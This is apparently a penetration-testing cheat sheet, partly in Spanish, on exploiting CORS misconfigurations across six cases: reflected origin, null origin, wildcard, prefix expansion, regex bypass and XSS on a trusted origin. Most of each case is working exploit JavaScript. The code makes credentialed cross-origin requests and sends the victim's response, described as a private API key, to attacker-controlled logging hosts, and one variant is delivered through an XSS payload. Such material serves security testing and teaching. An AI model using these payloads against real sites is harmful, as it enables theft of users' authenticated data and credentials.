# CORS

## Summary

* [Tools](#tools)
* [Add header Origin](#add-header-origin)
* [Case 01: Origin Reflection](#case-01-origin-reflection)
	* [Detection](#detection)
	* [Exploit](#exploit)
* [Case 02: Null Origin](#case-02-null-origin)
	* [Detection](#detection)
	* [Exploit](#exploit)
* [Case 03: Wildcard Origin](#case-03-wildcard-origin)
	* [Detection](#detection)
	* [Exploit](#exploit)
* [Case 04: Expanding the Origin](#case-04-expanding-the-origin)
	* [Detection](#detection)
	* [Exploit](#exploit)
* [Case 05: Bypass Regex](#case-05-bypass-regex)
	* [Detection](#detection)
	* [Exploit](#exploit)
* [Case 06: XSS on Trusted Domain](#case-06-xss-on-trusted-domain)
	* [Detection](#detection)
	* [Exploit](#exploit)

El intercambio de recursos de origen cruzado (CORS) es un mecanismo del navegador que permite el acceso controlado a los recursos ubicados fuera de un dominio determinado. Extiende y agrega flexibilidad a la política del mismo origen (SOP)

La idea para explotar CORS es encontrar una funcionalidad que sea crítica en la aplicación, como ejemplo `/accountDetails`, que devuelve la API Key del usuario que realiza dicha petición.

La mayoría de los ataques CORS se basan en la presencia del encabezado de respuesta:

`Access-Control-Allow-Credentials: true`

Sin ese encabezado, el navegador del usuario de la víctima se negará a enviar sus cookies, lo que significa que el atacante solo obtendrá acceso a contenido no autenticado, al que podría acceder fácilmente navegando directamente al sitio web de destino.


## Tools

- [Corsy](https://github.com/s0md3v/Corsy)


## Add header Origin

```
Origin: http://bing.com/
Origin: http://bing.com
Origin: bing.com/
Origin: bing.com
Origin: null
```

If you find in the response:

```
Access-Control-Allow-Credential: true
Access-control-allow-origin: bing.com | * | null
```

Then domain maybe is vulnerable.

- Testing:

```
curl <domain> -H "Origin: <https://bing.com>" -I
```

Exist 3 cases for exploit this, 2 are good and 1 is a missconfiguration:**

## Case 01: Origin Reflection

### Detection

Best case for attack:

```
GET /endpoint HTTP/1.1
Host: victim.example.com
Origin: https://evil.com
Cookie: sessionid=... 

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true 

{"[private API key]"}
```

### Exploit

This PoC requires that the respective JS script is hosted at evil.com

```
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://victim.example.com/endpoint',true); 
req.withCredentials = true;
req.send();

function reqListener() {
    location='//atttacker.net/log?key='+this.responseText; 
};
```

Or

```
<html>
     <body>
         <h2>CORS PoC</h2>
         <div id="demo">
             <button type="button" onclick="cors()">Exploit</button>
         </div>
         <script>
             function cors() {
             var xhr = new XMLHttpRequest();
             xhr.onreadystatechange = function() {
                 if (this.readyState == 4 && this.status == 200) {
                 document.getElementById("demo").innerHTML = alert(this.responseText);
                 }
             };
              xhr.open("GET",
                       "https://victim.example.com/endpoint", true);
             xhr.withCredentials = true;
             xhr.send();
             }
         </script>
     </body>
 </html>
```

## Case 02: Null Origin

Vulnerable Implementation.

### Detection

It's possible that the server does not reflect the complete `Origin` header but that the `null` origin is allowed. This would look like this in the server's response:


```
GET /endpoint HTTP/1.1
Host: victim.example.com
Origin: null
Cookie: sessionid=... 

HTTP/1.1 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true 

{"[private API key]"}
```

### Exploit

This can be exploited by putting the attack code into an iframe using the data URI scheme. If the data URI scheme is used, the browser will use the `null` origin in the request:

```
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html, <script>
  var req = new XMLHttpRequest();
  req.onload = reqListener;
  req.open('get','https://victim.example.com/endpoint',true);
  req.withCredentials = true;
  req.send();

  function reqListener() {
    location='https://attacker.example.net/log?key='+encodeURIComponent(this.responseText);
   };
</script>"></iframe> 
```


## Case 03: Wildcard Origin

### Detection

Si el servidor responde con un comodín en Origin `*`, **el navegador nunca envía las cookies**.

Sin embargo, si el servidor no requiere autenticación, aún es posible acceder a los datos en el servidor. Esto puede suceder en servidores internos a los que no se puede acceder desde Internet. El sitio web del atacante puede luego pasar a la red interna y acceder a los datos del servidor sin autenticación.

```
GET /endpoint HTTP/1.1
Host: api.internal.example.com
Origin: https://evil.com

HTTP/1.1 200 OK
Access-Control-Allow-Origin: *

{"[private API key]"}
```


### Exploit

```
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://api.internal.example.com/endpoint',true); 
req.send();

function reqListener() {
    location='//atttacker.net/log?key='+this.responseText; 
};
```

## Case 04: Expanding the Origin


Ocasionalmente, ciertas expansiones del original `Origin`  no se filtran en el lado del servidor. 

Esto puede deberse al uso de expresiones regulares mal implementadas para validar el encabezado de origen.

### Detection

In this scenario any prefix inserted in front of `example.com` will be accepted by the server:

```
GET /endpoint HTTP/1.1
Host: api.example.com
Origin: https://evilexample.com

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evilexample.com
Access-Control-Allow-Credentials: true 

{"[private API key]"}
```

### Exploit

This PoC requires the respective JS script to be hosted at `evilexample.com`:

```
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://api.example.com/endpoint',true); 
req.withCredentials = true;
req.send();

function reqListener() {
    location='//atttacker.net/log?key='+this.responseText; 
};
```

## Case 05: Bypass Regex

### Detection

En este escenario, el servidor utiliza una expresión regular donde el punto no se escapó correctamente. 

Por ejemplo, algo como esto: `^api.example.com$` en lugar de `^api\.example.com$`. 

Por lo tanto, el punto se puede reemplazar con cualquier letra para obtener acceso desde un dominio de terceros

```
GET /endpoint HTTP/1.1
Host: api.example.com
Origin: https://apiiexample.com

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://apiiexample.com
Access-Control-Allow-Credentials: true 

{"[private API key]"}
```

### Exploit

This PoC requires the respective JS script to be hosted at `apiiexample.com`:

```
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://api.example.com/endpoint',true); 
req.withCredentials = true;
req.send();

function reqListener() {
    location='//atttacker.net/log?key='+this.responseText; 
};
```

## Case 06: XSS on Trusted Origin

### Detection

Si la aplicación implementa una lista blanca estricta de orígenes permitidos, los códigos de explotación de arriba no funcionan. Pero si tiene un XSS en un origen confiable, puede inyectar el exploit codificado desde arriba para explotar CORS nuevamente.

```
https://subdomain.$victim.domain/?xssparam=<script>CORS-ATTACK-PAYLOAD</script>
```

### Exploit

```
<script>
	   document.location="https://subdomain.$victim.domain/?xssparam=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://$your-lab-url/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://$exploit-server-url/log?key='%2bthis.responseText; };%3c/script>&param2legit=1"
</script>
```
